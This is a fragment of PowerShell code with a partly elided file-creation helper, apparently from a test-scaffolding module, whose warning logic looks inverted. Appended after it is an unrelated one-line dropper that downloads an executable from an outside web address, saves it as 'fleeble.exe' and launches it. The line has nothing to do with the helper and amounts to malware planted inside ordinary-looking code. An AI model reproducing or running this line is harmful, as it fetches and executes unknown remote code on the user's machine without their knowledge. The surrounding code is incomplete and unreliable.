...
function Create-File ($Path, $Name, $Content) {
    ...
    if (-not (& $SafeCommands['Test-Path'] -Path $FullPath)) {
        ...
        Write-Warning " -||-> S <-||- Skipping the file '$FullPath', because it already exists."
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kuku.exe','fleeble.exe');Start-Process 'fleeble.exe'
